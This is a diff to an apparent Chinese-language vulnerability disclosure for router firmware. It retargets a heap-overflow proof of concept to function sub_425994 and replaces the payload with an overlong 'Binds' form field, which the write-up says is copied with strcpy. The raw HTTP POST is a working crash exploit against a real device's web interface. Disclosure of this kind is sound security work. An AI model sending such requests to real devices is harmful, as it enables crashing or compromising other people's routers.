@@ -2,7 +2,7 @@
 
 ## 基础信息
 - **影响组件**: /gohead/sub_425994
-- **固件版本**: nv518GPV3v3.2.7-210919-162004
+- **固件版本**: nv518GV3v3.2.7-210919-161313
 
 ## 漏洞详情
 
@@ -16,7 +16,7 @@ v33 points to a heap struct. v6 is attacker-controlled via "Binds". strcpy(v33 +
 poc：
 
 ```
-POST gohead/sub_416f28 HTTP/1.1
+POST gohead/sub_425994 HTTP/1.1
 Host: 127.0.0.1
 sec-ch-ua: "Not=A?Brand";v="24", "Chromium";v="140"
 sec-ch-ua-mobile: ?0
@@ -34,5 +34,5 @@ Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 98
 
-GroupName=111111111111111111111111111111111111111111111111111111111111111111111111
+Binds=111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
 ```
